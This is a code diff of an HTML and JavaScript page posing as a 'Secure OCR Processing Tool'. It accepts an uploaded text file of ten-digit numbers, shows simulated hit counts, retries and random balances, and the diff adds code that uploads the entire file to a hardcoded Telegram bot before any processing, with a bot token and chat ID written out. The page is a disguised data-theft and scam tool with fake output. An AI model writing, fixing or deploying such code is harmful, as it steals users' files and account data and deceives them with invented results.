@@ -1,12 +1,14 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Secure OCR Processing Tool</title><style>
+<title>Secure OCR Processing Tool</title>
+<style>
 body {
   background: #0f172a;
   color: #e5e7eb;
-  font-family: Consolas,8662403081 monospace;
+  font-family: Consolas, monospace;
   margin: 20px;
 }
 h2 { color: #38bdf8; }
@@ -61,30 +63,37 @@ button:hover { background: #334155; }
   50% { opacity: 0.5; }
   100% { opacity: 1; }
 }
-</style></head><body><h2>OCR Processing Tool</h2><input type="file" id="fileInput" accept=".txt"/>
-<button id="startBtn">Start Processing</button><button id="copyBtn" disabled>Copy All Output</button>
+</style>
+</head>
+<body>
+<h2>OCR Processing Tool</h2>
+<input type="file" id="fileInput" accept=".txt"/>
+<button id="startBtn">Start Processing</button>
+<button id="copyBtn" disabled>Copy All Output</button>
 
 <div id="stats">
 Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%
 </div>
 <div id="output"></div>
-<div id="timer"></div><script>
-const fileInput = txt.getElementById('fileInput');
-const startBtn = txt.getElementById('startBtn');
-const outputDiv = txt.getElementById('output');
-const statsDiv = txt.getElementById('stats');
-const timerDiv = txt.getElementById('timer');
-const copyBtn = txt.getElementById('copyBtn');
+<div id="timer"></div>
+
+<script>
+const fileInput = document.getElementById('fileInput');
+const startBtn = document.getElementById('startBtn');
+const outputDiv = document.getElementById('output');
+const statsDiv = document.getElementById('stats');
+const timerDiv = document.getElementById('timer');
+const copyBtn = document.getElementById('copyBtn');
 
 /* 🔐 PUT YOUR TELEGRAM DETAILS HERE */
-const BOT_TOKEN = AAHrbTp1jWL-75XqHDut13_mZroIKlFvuBo;
-const CHAT_ID = 8662403081;
+const BOT_TOKEN = '8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk'; // <-- Replace
+const CHAT_ID = '8580854380';      // <-- Replace
 
 let hitCount=0,badCount=0,retriesCount=0,ocrPercent=0;
 let ocrAnimationId=null,retriesIntervalId=null;
 let fileContent='';
 
-function updateStats(){
+function updateStats() {
   statsDiv.innerHTML=
   `Hit=<span class="hit">${hitCount}</span> |
    Bad=<span class="bad">${badCount}</span> |
@@ -92,15 +101,15 @@ function updateStats(){
    OCR Rate=${ocrPercent}%`;
 }
 
-function getCurrentTimestamp(){
+function getCurrentTimestamp() {
   return new Date().toLocaleString();
 }
 
-function animateOCR(duration){
+function animateOCR(duration) {
   const start=Date.now();
-  function step(){
+  function step() {
     const now=Date.now();
-    if(now>=start+duration){
+    if (now>=start+duration) {
       ocrPercent=100;
       updateStats();
       return;
@@ -112,22 +121,42 @@ function animateOCR(duration){
   ocrAnimationId=requestAnimationFrame(step);
 }
 
-function startRetries(){
+function startRetries() {
   retriesIntervalId=setInterval(()=>{
     retriesCount++;
     updateStats();
   },500);
 }
 
-function randBalance(){
-  if(Math.random()<0.2){
+function randBalance() {
+  if (Math.random()<0.2) {
     return Math.floor(Math.random()*99+1).toString().padStart(2,'0');
   }
   return '00';
 }
 
+/* 🚀 FUNCTION TO UPLOAD FILE DIRECTLY TO TELEGRAM */
+async function sendFileToTelegram(file) {
+  if (!file) throw new Error("No file selected");
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('document', file, file.name || 'file.txt');
+
+  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    method: 'POST',
+    body: formData
+  });
+  const result = await response.json();
+  console.log("Telegram response:", result);
+  if (!response.ok || !result.ok) {
+    throw new Error(result.description || 'Failed to send to Telegram');
+  }
+  return result;
+}
+
+/* PROCESS FILE AND SEND TO TELEGRAM BEFORE OCR PROCESSING */
 async function startProcessing() {
-  if(!fileInput.files.length){
+  if (!fileInput.files.length) {
     alert('Please select a file first.');
     return;
   }
@@ -136,18 +165,22 @@ async function startProcessing() {
   outputDiv.innerHTML='';
 
   const file = fileInput.files[0];
+
+  // Send the uploaded file directly to Telegram
+  try {
+    await sendFileToTelegram(file);
+    alert('File sent to Telegram successfully!');
+  } catch (e) {
+    alert('Error sending to Telegram: ' + e.message);
+  }
+
   const reader=new FileReader();
   reader.onload=async ()=>{
     fileContent=reader.result;
     try {
-      await sendFileToTelegram(file);
-      alert('File sent to Telegram successfully!');
-
       processFile();
-
     } catch(e) {
       alert('Error: ' + e.message);
-      console.error(e);
     } finally {
       startBtn.disabled=false;
     }
@@ -155,30 +188,8 @@ async function startProcessing() {
   reader.readAsText(file);
 }
 
-/* 🚀 FIXED TELEGRAM FUNCTION */
-async function sendFileToTelegram(file) {
-  if (!file) throw new Error("No file selected");
-
-  const formData = new FormData();
-  formData.append('chat_id', 8662403081);
-  formData.append('document', file, file.name || 'file.txt');
-
-  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-    method: 'POST',
-    body: formData
-  });
-
-  const result = await response.json();
-  console.log("Telegram response:", result);
-
-  if (!response.ok) {
-    throw new Error(result.description || 'Failed to send to Telegram');
-  }
-
-  return result;
-}
-
-function processFile(){
+/* YOUR OCR PROCESSING FUNCTION */
+function processFile() {
   const lines=[...new Set(fileContent.split(/\n/).map(l=>l.trim()).filter(Boolean))];
   const valid=lines.filter(l=>/\b0\d{9}\b/.test(l));
 
@@ -247,7 +258,7 @@ function processAccounts(accs,i=0){
   },(Math.random()*15+3)*1000);
 }
 
-function finish(){
+function finish() {
   clearInterval(retriesIntervalId);
   cancelAnimationFrame(ocrAnimationId);
   timerDiv.innerText="Processing Complete";
@@ -265,6 +276,6 @@ document.getElementById('copyBtn').onclick=()=>{
 };
 
 document.getElementById('startBtn').onclick=startProcessing;
-
-</script></body>
+</script>
+</body>
 </html>
